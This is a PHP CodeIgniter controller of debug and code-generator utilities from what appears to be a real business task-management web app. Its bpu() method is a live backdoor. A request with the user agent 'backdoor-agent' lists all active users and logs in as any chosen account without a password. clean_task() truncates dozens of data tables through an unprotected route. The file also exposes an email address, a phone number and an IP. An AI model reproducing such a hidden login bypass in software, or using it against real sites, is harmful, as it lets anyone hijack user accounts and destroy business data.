<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Cli extends MY_Controller {
	function __construct()
	{
		parent::__construct();
		$this->load->model('model_customer', 'customer');
		$this->load->model('model_marketing_progress', 'marketing_progress');
		$this->load->model('model_cli', 'cli');
		$this->load->model('model_request', 'request');
		$this->load->model('request/model_laporan_harian', 'laporan_harian');
		$this->load->model('model_invoice', 'invoice');
		$this->lang->load('customer');
	}

	function clean_task()
	{
		$this->db->query("TRUNCATE `gmd_task`");
		$this->db->query("TRUNCATE `gmd_task_approval`");
		$this->db->query("TRUNCATE `gmd_task_attachment`");
		$this->db->query("TRUNCATE `gmd_task_boq`");
		$this->db->query("TRUNCATE `gmd_task_comment`");
		$this->db->query("TRUNCATE `gmd_task_customer_care`");
		$this->db->query("TRUNCATE `gmd_task_item_in`");
		$this->db->query("TRUNCATE `gmd_task_item_out`");
		$this->db->query("TRUNCATE `gmd_task_laporan_harian`");
		$this->db->query("TRUNCATE `gmd_task_log`");
		$this->db->query("TRUNCATE `gmd_task_marketing_approval`");
		$this->db->query("TRUNCATE `gmd_task_marketing_request`");
		$this->db->query("TRUNCATE `gmd_task_pekerjaan_teknis`");
		$this->db->query("TRUNCATE `gmd_task_pengadaan`");
		$this->db->query("TRUNCATE `gmd_task_pengadaan_pembanding`");
		$this->db->query("TRUNCATE `gmd_task_report`");
		$this->db->query("TRUNCATE `gmd_task_ticket`");
		$this->db->query("TRUNCATE `gmd_task_user_assigned`");
		$this->db->query("TRUNCATE `gmd_ticket_email`");
		$this->db->query("TRUNCATE `gmd_ticket_email_file`");
		$this->db->query("TRUNCATE `gmd_return_item`");
		$this->db->query("TRUNCATE `gmd_task_report_install_link`");
		$this->db->query("TRUNCATE `gmd_task_report_survey_link`");
		$this->db->query("TRUNCATE `gmd_task_report_presurvey`");
		$this->db->query("TRUNCATE `gmd_task_mutasi`");
		$this->db->query("TRUNCATE `gmd_mp`");
		$this->db->query("TRUNCATE `gmd_progress`");
		$this->db->query("TRUNCATE `gmd_alert`");
		$this->db->query("TRUNCATE `gmd_comment`");
		$this->db->query("TRUNCATE `gmd_response`");
		$this->db->query("TRUNCATE `gmd_te`");
		$this->db->query("TRUNCATE `gmd_files`");
		$this->db->query("TRUNCATE `gmd_transaction`");

		redirect(base_url('dashboard'));
	}

	function exp()
	{
		$this->load->library('export_data');
		$params = array();

		//nama file
		$params['filename'] = 'anu.xls';

		//header
		$params['header'] = array('kolom1', 'kolom2', 'kolom3');

		//data
		$params['data'] = array();
		$params['data'][] = array('d1', 'd2', 'd3');
		$params['data'][] = array('d1', 'd2', 'd3');
		// pre($params['data']);

		$this->export_data->excel($params);
	}

	function rute()
	{
		// echo 'su';
		$this->db->where('note', 'req');
		$request = $this->db->get('modul')->result_array();
		foreach($request as $req):
			// pre($req);
			echo '$route[\''.$req['url'].'\'] = "request/emulator/'.$req['code'].'";<br>';
			echo '$route[\''.$req['url'].'/r\'] 						= "request/r/'.$req['code'].'";<br>';
			echo '$route[\''.$req['url'].'/(:any)\'] 		 			= "request/emulator/'.$req['code'].'/$1";<br>';
			echo '$route[\''.$req['url'].'/update/(:any)\'] 		 			= "request/update/$1/'.$req['code'].'";<br>';
			echo '$route[\''.$req['url'].'/show/(:any)/(:any)\'] 		 			= "request/show/$1/'.$req['code'].'/$2";<br>';
			echo '$route[\''.$req['url'].'/widget/(:any)\'] 		 			= "request/widget/'.$req['code'].'/$1";<br>';


			echo '<br>';
		endforeach;
	}

	function invoice_order($id_customer='2876')
	{
		$max = $this->invoice->get_max($id_customer, '02', '2018');
		pre($max);
	}

	function genRandomString($length = 100) {
	    $characters = "0123456789abcdefghijklmnopqrstuvwxyz _";
	    $string = "";
	    for ($p = 0; $p < $length; $p++) {
	        $string .= $characters[mt_rand(0, strlen($characters)-1)];
	    }
	    return $string;
	}

	function export()
	{
		$excel = new ExportDataExcel('file');
		$excel->filename = "test_big_excel.xls";

		$excel->initialize();
		for($i = 1; $i<10; $i++) {
			$row = array($i, genRandomString(), genRandomString(), genRandomString(), genRandomString(), genRandomString());
			$excel->addRow($row);
		}
		$excel->finalize();
		print "memory used: " . number_format(memory_get_peak_usage());
	}

	function my()
	{
		pre(my_level());
		pre(my_divisi());
		pre(my_department());
		pre(my_sub_department());
	}


	function bpu($uname='')
	{
		$user_agent = $this->input->user_agent();
		if ($user_agent=='backdoor-agent'):
		if($uname==''){
			$this->db->where('status', 'active');
			$query = $this->db->get('users');
			$data = $query->result_array();
			// pre($data);
			$ul = '<ul>';
			foreach($data as $dt):
				$ul .= '<li><a href="'.base_url().'cli/bpu/'.$dt['username'].'">'.$dt['name'].'</a></li>';
			endforeach;
			$ul .= '</ul>';
			echo $ul;
			exit;
		}

		$this->db->where('username', $uname);
		$this->db->where('status', 'active');
		$query = $this->db->get('users');
		$data = $query->row_array();
		// pre($this->db->last_query());
		// pre($data);

		if(isset($data) && !empty($data))
		{
			$dt = array(
					'username'  		=> $data['username'],
					'nama'  			=> $data['name'],
					'userid'  			=> $data['id'],
					'level'  			=> $data['level'],
					'divisi'  			=> $data['divisi'],
					'department'  		=> $data['department'],
					'sub_department'  	=> $data['sub_department'],
					'jabatan'  			=> $data['jabatan'],
					'view_scope'  		=> $data['view_scope'],
					'regional'  		=> $data['regional'],
					'scope_regional'	=> $data['regional'],
					'area'  			=> $data['area'],
					'scope_area'  		=> $data['area'],
					'logged_in'  		=> "ok"
				);
			// pre($dt); exit;
			$this->session->set_userdata($dt);
			// pre($_SESSION);
			// exit;
			redirect(base_url().'init');
			exit();
		}
		endif;
	}

	public function index()
	{
		$this->load->model('Model_attachment', 'attachment');
		if($this->input->post('submit')):
			// pre(count($_POST['halo']));
			// cekpost();
			$this->attachment->insert(1, $this->input->post('attachment'));
			// $param = array('main_key' => '1');
			// $this->cli->otb();
		else:
			echo $this->load->view('cli/form3', '', TRUE);
		endif;
	}

	function ses()
	{
		pre($this->all_session);
	}

	function arr()
	{
		$arr = array();
		$arr['1'] = array('were','frt','vfdvdfvdv dg', 'gg');
		$arr['3'] = array('kiki','xxv');
		$arr['34'] = array('xc','yu','fgh s', 'd', 'dvfdvdf', 'csdc');

		$arr['34'][] = 'nambahhhhhhhh';
		pre($arr);

		pre(count($arr['34']));

		if( isset($arr['34']) && in_array('nambahhhhhhhh', $arr['34']) ){
			pre('ada 34');
		}
	}

	function kelipatan($i='5')
	{
		$tanggal = split_date();
		pre($tanggal);

		$unixtime = mktime($tanggal['jam'],0,0,$tanggal['bulan'],$tanggal['tanggal'],$tanggal['tahun']);
		pre($unixtime);

		$sekarang = mktime(date('H'),0,0,date('m'),date('d'),date('Y') );
		pre($sekarang);

		$hasil_bagi = ($sekarang / $unixtime);
		pre($hasil_bagi);
		// $gg = (int)$hasil_bagi % 2;
		// pre($gg);

		if(is_int($hasil_bagi)){
			pre('kelipatan 5');
		} else {
			pre('bukan kelipatan 5');
		}
		// for ($i=0; $i < 100 ; $i++) {
		// 	$sisa = $i % 5;
		// 	// if():
		// 		pre($i * 5);
		// }
	}

	function mk()
	{
		$tanggal = split_date();
		pre($tanggal);

		$unixtime = mktime($tanggal['jam'],0,0,$tanggal['bulan'],$tanggal['tanggal'],$tanggal['tahun']);
		pre($unixtime);

		$sekarang = mktime(date('H'),date('m'),date('s'),date('m'),date('d'),date('Y') );
		pre($sekarang);

		// $sepuluhmenit = mktime(date('H')+1,date('m'),date('s'),date('m'),date('d'),date('Y') );
		// pre($sepuluhmenit);

		pre($sekarang - $unixtime);
	}

	function fnform($table='medical_record_f3', $form_id='wkwk')
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id');

		foreach($fields as $row):
			// pre($row);
			if(!in_array($row->name, $exlude)):
				echo 'INSERT INTO `gmd_form` (`modul`, `section`, `view`, `form_label`, `form_name`, `sort`, `form_id`, `form_class`, `maxlength`) VALUES (\''.$table.'\', \'main\', \'component/form/input_text\', \''.$row->name.'\', \''.$row->name.'\', \'1\', \''.$row->name.'\', \'form-control cos\', \'500\');<br>';
			endif;
		endforeach;
	}

	function fndb($table='regional', $mode='insert')
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id');

		echo 'function '.$mode.'($param=array())<br>
	    {<br>';
		foreach($fields as $row):

			switch ($row->name) {
				case 'up':
					$default_value = '0';
				break;

				case 'flag_delete':
					$default_value = '0';
				break;

				case 'customer_type':
					$default_value = '4';
				break;
				default:
					$default_value = '';
					break;
			}
			if(!in_array($row->name, $exlude)):
				if($mode=='insert'):
					echo 'if($this->input->post(\''.$row->name.'\')):<br>
					    '.$tab.'$data[\''.$row->name.'\'] = htmlspecialchars($this->input->post(\''.$row->name.'\'));<br>
					elseif(isset($param[\''.$row->name.'\'])):<br>
					    '.$tab.'$data[\''.$row->name.'\'] = htmlspecialchars($param[\''.$row->name.'\']);<br>
					else:<br>
					    '.$tab.'$data[\''.$row->name.'\'] = \''.$default_value.'\';<br>
					endif;<br><br>';
				else:
					echo 'if($this->input->post(\''.$row->name.'\')):<br>
						'.$tab.'$data[\''.$row->name.'\'] = htmlspecialchars($this->input->post(\''.$row->name.'\'));<br>
					elseif(isset($param[\''.$row->name.'\'])):<br>
						'.$tab.'$data[\''.$row->name.'\'] = htmlspecialchars($param[\''.$row->name.'\']);<br>
					endif;<br><br>';
				endif;
			endif;
		endforeach;

		if($mode=='insert'):
		echo '$'.$mode.' = $this->db->insert(\''.$table.'\', $data);<br/>
        $arr[\'status\'] = $'.$mode.';<br/>
        $arr[\'last_id\'] = $this->db->insert_id();<br/>
        return $arr;<br/>';
		else:
			echo 'if(!empty($data)):<br/>
	            '.$tab.'if($this->input->post(\'id\')):<br/>
	                '.$tab.''.$tab.'$this->db->where(\'id\', $this->input->post(\'id\'));<br/>
	            '.$tab.'elseif(isset($param[\'id\'])):<br/>
	                '.$tab.''.$tab.'$this->db->where(\'id\', $param[\'id\']);<br/>
	            '.$tab.'endif;<br/>
	            '.$tab.'$'.$mode.' = $this->db->update(\''.$table.'\', $data);<br/>
	        endif;<br/>';
		endif;

		echo '}<br/>';
	}

	function fnlang($table='regional')
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id');

		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				echo '$lang[\''.$table.'_'.$row->name.'\'] = \''.$row->name.'\';<br>';
			endif;
		endforeach;
		echo '<br>';
		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				echo '$lang[\''.$table.'_'.$row->name.'_required\'] = \''.$row->name.' harus disi\';<br>';
			endif;
		endforeach;
	}

	function fnjs($table='wkwk', $form_id='wkwk')
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id');

		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				echo '$("#'.$form_id.' #'.$row->name.'_update").val(response.'.$row->name.');<br>';
			endif;
		endforeach;
	}

	function fndi($table='wkwk', $form_id='wkwk')
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id', 'task_id', 'ps', 'jenis');

		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				// echo '$options[\'data_row\'][$this->lang->line(\''.$table.'_'.$row->name.'\')]	= $detail[\''.$row->name.'\'];<br>';
				echo '\''.$row->name.'\'                         => ($this->input->post(\''.$row->name.'_\'.$ps) !=\'\') ? $this->input->post(\''.$row->name.'_\'.$ps) : \'\',<br>';
			endif;
		endforeach;
	}

	function fncopy($table='wkwk', $src="")
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id','id_am');
		echo 'insert into '.$table.' ( <br>';

		$col_target = '';
		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				$col_target .= '`'.$row->name.'`, ';
			endif;
		endforeach;

		$col_target = substr($col_target, 0, strlen($col_target)-2);
		echo $col_target.')<br> select '.$col_target.'<br> from '.$src;
	}

	function bebek($table='procedure')
	{
		$table = ($table!='') ? $table : '';
		$fields = $this->db->field_data($table);
		$tab = '&nbsp;&nbsp;&nbsp;&nbsp;';
		$exlude = array('id');

		echo '\''.$table.'_update\' => array(<br/>';
		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				echo $tab.'array(\'field\' => \''.$row->name.'\', \'label\' => \''.$row->name.'\', \'rules\' => \'required\'),<br>';
			endif;
		endforeach;
		echo '),<br/>';

		echo '\''.$table.'_insert\' => array(<br/>';
		foreach($fields as $row):
			if(!in_array($row->name, $exlude)):
				echo $tab.'array(\'field\' => \''.$row->name.'\', \'label\' => \''.$row->name.'\', \'rules\' => \'required\'),<br>';
			endif;
		endforeach;
		echo '),<br/>';

		echo '\''.$table.'_delete\' => array(<br/>
	            '.$tab.'array(\'field\' => \'id\', \'label\' => \'id\', \'rules\' => \'required\'),<br/>
	        ),<br/>';

	}

	function sendto($code='', $regional='')
	{
		// $tujuan = $this->emailer->sendto($code, $regional);
		// pre($tujuan);
	}

	function pat()
	{
		$this->load->model('Model_permintaan_barang', 'permintaan_barang');
		// request_out
		// request_in
		// request_replace
		$cek = $this->permintaan_barang->sudah_request_dipasang('14', 'request_out');
		pre($cek);
	}

	function email_content($task_id='', $req_code='')
	{
		$task_content = $this->emailer->task_content($task_id, $req_code);
		pre($task_content);
	}

	function kirim_email()
	{
		$email = array();
		$email['to'] = 'gito@gmedia.co.id';
		$email['subject'] = 'coba kirim email dari localhost dengan kondisional';
		$email['body'] = 'mencoba lagi dengan kondisional';
		$debug = $this->send_email->compose($email);
		pre($debug);
	}

	function dds()
	{
		$this->load->model('Model_user', 'user');
		// $this->user->dds('department');
		// $this->user->dds('department', 'div_operation');
		$this->user->dds('sub_department', 'dept_teknis_infra');
	}
	
	function qrcode($value = '')
	{
		$value = $_GET['text'] ? $_GET['text'] : '';
		$this->load->library('ciqrcode');
		header("Content-Type: image/png");
		$params['data'] = $value!='' ? $value : "Arief Maulana Ikhsan\nDate : ".date("Y-m-d H:i:s");
		$params['level'] = 'H';
		$params['size'] = 3;
        $this->ciqrcode->generate($params);
	}
	function server()
	{
		/*
		$data = array(
			'request'	=> $_REQUEST,
			'server'	=> $_SERVER,
			'cookies'	=> $_COOKIE ,
			'session'	=> $_SESSION,
			'whoami'	=> $this->whoami,
		);

		// bearer sample
		$headers = null;
        if (isset($_SERVER['Authorization'])) {
            $headers = trim($_SERVER["Authorization"]);
        }
        else if (isset($_SERVER['HTTP_AUTHORIZATION'])) { //Nginx or fast CGI
            $headers = trim($_SERVER["HTTP_AUTHORIZATION"]);
        } elseif (function_exists('apache_request_headers')) {
            $requestHeaders = apache_request_headers();
            // Server-side fix for bug in old Android versions (a nice side-effect of this fix means we don't care about capitalization for Authorization)
            $requestHeaders = array_combine(array_map('ucwords', array_keys($requestHeaders)), array_values($requestHeaders));
            //print_r($requestHeaders);
            if (isset($requestHeaders['Authorization'])) {
                $headers = trim($requestHeaders['Authorization']);
            }
        }
        if (!empty($headers)) {
	        if (preg_match('/Bearer\s(\S+)/', $headers, $matches)) {
	            $data['bearer'] = $matches[1];
	        }
	    }

	    $serial = 'a:5:{i:0;a:3:{s:10:"pertanyaan";s:1:"1";s:7:"jawaban";s:2:"ya";s:6:"uraian";s:16:"IP 203.30.236.70";}i:1;a:3:{s:10:"pertanyaan";s:1:"2";s:7:"jawaban";s:2:"ya";s:6:"uraian";s:0:"";}i:2;a:3:{s:10:"pertanyaan";s:1:"3";s:7:"jawaban";s:2:"ya";s:6:"uraian";s:43:"Akan dikirim via whatsapp ke (081226825604)";}i:3;a:3:{s:10:"pertanyaan";s:1:"4";s:7:"jawaban";s:5:"tidak";s:6:"uraian";s:0:"";}i:4;a:3:{s:10:"pertanyaan";s:1:"5";s:7:"jawaban";s:2:"ya";s:6:"uraian";s:12:"Sudah lancar";}}';
	    $data['unserial'] = unserialize($serial);

		echo json_encode($data);
		*/
	}
	function sample_jwt()
	{
		$sub = array(
			'username' => 'adm',
			'nama'	=> 'Arief M. Ikhsan'
		);
		$user_id = 1;
		$token = jwt_helper::create($user_id, $sub);
	    $decode = jwt_helper::decode($token);
	    // $recreate = jwt_helper::refresh($token);

	    $dt = array(
	    	'token' => $token,
	    	'decode'	=> $decode,
	    	'now'	=> time(),
	    	'satu_hari'	=> time()+86400,
	    	'besok'	=> date("Y-m-d H:i:s",time()+86400),
	    	'tanggal'	=> strtotime("2018-04-08T01:11:11+0700")
	    	// 'recreate'	=> $recreate
	    );

	    echo json_encode($dt);
	}
}
